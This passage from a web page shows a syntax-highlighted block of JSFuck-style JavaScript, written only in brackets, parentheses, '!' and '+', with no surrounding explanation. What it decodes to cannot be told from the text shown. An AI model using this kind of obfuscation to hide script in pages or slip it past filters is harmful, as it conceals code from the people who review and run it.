class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token 